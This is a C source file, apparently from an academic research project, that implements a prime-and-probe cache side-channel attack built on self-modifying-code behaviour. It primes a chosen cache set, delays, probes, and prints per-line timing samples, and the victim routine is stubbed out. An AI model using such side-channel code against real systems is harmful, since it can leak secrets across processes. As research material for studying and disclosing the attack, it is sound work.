/*
 * SMaCk prime and probe attack variatns 
 *
 * 
 * authors: 
 * Seonghun Son <seonghun@iastate.edu>
 * Daniel Moghimi <danielmm@googl.com>
 * Berk Gulmezoglu <bgulmez@iastate.edu>
 * 
 * Description:
 * Prime and Probe attack variants utilizing SMC behaviors
 * 
 */

#include "prime_probe.h"


//#include <papi.h>
#include "cacheutils.h"


#include <unistd.h> /* sysconf(3) */
#include <sched.h>

#include <string.h>
#include <stdint.h>

#include <fcntl.h>
#include <sys/mman.h>
#include <stdio.h>
#include <errno.h>

#include <time.h>

#include <x86intrin.h>

#define PAGE_SIZE 4096
#define NUM_EVENTS 3
#define THRES 100


#define VICTIM_ACCESS 10

//RDTSC timer
/*uint64_t rdtsc() {
    unsigned int lo, hi;
    __asm__ volatile("rdtsc" : "=a" (lo), "=d" (hi));
    return ((uint64_t)hi << 32) | lo;
}
*/

uint64_t start_m, start_s, end_m, end_s, cycles_m, cycles_s;

extern void delay (uint64_t cycle);

void victim() {
//*********If you want to see manually you can check the cache eviction
/*
	//mfence();
	asm volatile("movb $0x41, %0" : "=m" (*(volatile unsigned char *) smc_target_set10_5));
	asm volatile("clflush %0" : "=m" (*(volatile unsigned char *) smc_target_set0_7) );
*/
}

void waste_cycle(uint64_t n){
    for(uint64_t i = 0; i < n; i++);
}

void warmup(){    
    waste_cycle(50000);
}




int main( int argc, char **argv )
{ 
   if (argc < 2){
        printf("usage: %s <target_set> <delay_cycle> <nsamples> !!!\n", argv[0]);
        return 1;
    }
    int target_set1 = atoi(argv[1]);
    int delayLoopCount = atoi(argv[2]);
    int nSamples = atoi(argv[3]);


    prime_probe_mprotect_all();
    uint64_t sampleMemSize = nSamples * sizeof(sample_block);
    sample_block * tSamples = malloc(sampleMemSize);
    memset(tSamples, 0, sampleMemSize);

    delay(1000000); // Warmup loop
    
    
    for(uint64_t i = 0; i < nSamples; i++){
	   
	    //Prime phase 
	    prime_set_func[target_set1]();
	   
	   
	    //Delay loop 
	    delay(delayLoopCount);
	   
	   /*If you want to perform manually*/
	   /* _mm_mfence();
	   // victim();
	    _mm_mfence();
	   */

 	   
	   
	    //Probe phase 
	    probe_set_func[target_set1](&tSamples[i]);

    }

 
    for(uint64_t i = 0; i  < nSamples; i++){
	    uint64_t min = tSamples[i].lines[7]; 

	    for(uint8_t j = 0; j < SET_ASSOC; j++){
		    if(tSamples[i].lines[j] < min) 
		    {
			    min = tSamples[i].lines[j];
		    }
		     printf("%lu,", tSamples[i].lines[j]);
		     
		     //To achieve minimum values
		     //printf("%lu,",min);


	    }
	    /*
	    if (min < THRES && min > 0) {
		    //printf("1");
		    //printf("%lu,",min);
	    }
	    else{
		    printf("0");
	    }
	    */
	    printf("\n");
    }


  free(tSamples);
  return 0;
}


